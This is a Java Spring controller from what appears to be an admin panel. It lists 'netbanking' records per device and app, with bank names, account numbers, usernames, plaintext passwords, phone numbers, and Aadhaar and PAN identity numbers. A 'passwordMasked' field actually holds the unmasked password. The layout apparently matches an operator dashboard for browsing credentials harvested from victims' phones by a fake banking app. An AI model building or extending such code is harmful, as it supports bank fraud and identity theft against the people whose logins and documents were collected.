package com.admingateway.web;

import com.admingateway.grpc.NetbankingGrpcClient;
import com.admingateway.grpc.netbanking.ListNetbankingRequest;
import com.admingateway.security.SessionValidator;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.time.Instant;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/netbanking")
public class NetbankingRestProxyController {

    private final SessionValidator sessionValidator;
    private final NetbankingGrpcClient grpc;

    public NetbankingRestProxyController(SessionValidator sessionValidator, NetbankingGrpcClient grpc) {
        this.sessionValidator = sessionValidator; this.grpc = grpc;
    }

    @GetMapping
    public ResponseEntity<Map<String,Object>> list(@CookieValue(value="asid", required=false) String asid,
                                   @RequestHeader(value="X-Session-Id", required = false) String sidHeader,
                                   @RequestParam(value="deviceId", required=false) String deviceId,
                                   @RequestParam(value="q", required=false) String q,
                                   @RequestParam(value="page", defaultValue="0") int page,
                                   @RequestParam(value="size", defaultValue="50") int size) {
        String sid = (sidHeader!=null && !sidHeader.isBlank()) ? sidHeader : asid;
        var v = sessionValidator.validate(sid); if (!v.active()) return ResponseEntity.status(401).build();
        if (v.appId()==null || v.appId().isBlank()) {
            return ResponseEntity.badRequest().body(Map.of(
                    "error", "missing_app_id",
                    "message", "Admin has no assigned app. Set Assigned App for this admin in Admin panel and retry."
            ));
        }
        var req = ListNetbankingRequest.newBuilder()
                .setAdminId(v.adminId()==null?"":v.adminId())
                .setAppId(v.appId()==null?"":v.appId())
                .setDeviceId(deviceId==null?"":deviceId)
                .setQ(q==null?"":q)
                .setPage(Math.max(0, page))
                .setSize(Math.max(1, Math.min(200, size)))
                .build();
        var resp = grpc.list(req);
        List<Map<String,Object>> items = resp.getItemsList().stream().map(it -> {
            Map<String,Object> m = new HashMap<>();
            m.put("id", it.getId());
            m.put("adminId", it.getAdminId());
            m.put("appId", it.getAppId());
            m.put("deviceId", it.getDeviceId());
            m.put("bankName", it.getBankName());
            m.put("accountNumber", it.getAccountNumber());
            m.put("username", it.getUsername());
            String pw = it.getPassword();
            if (pw != null && !pw.isBlank()) {
                m.put("password", pw);
                m.put("passwordMasked", pw);
            } else {
                m.put("password", null);
                m.put("passwordMasked", null);
            }
            m.put("ifscCode", it.getIfscCode());
            m.put("phoneNumber", it.getPhoneNumber());
            m.put("adharCard", it.getAdharCard());
            m.put("panCard", it.getPanCard());
            m.put("eventTimestamp", Instant.ofEpochMilli(it.getEventTimestampMs()));
            return m;
        }).toList();
        Map<String,Object> out = new HashMap<>();
        out.put("items", items);
        out.put("page", resp.getPage());
        out.put("size", resp.getSize());
        out.put("count", resp.getCount());
        return ResponseEntity.ok(out);
    }
}
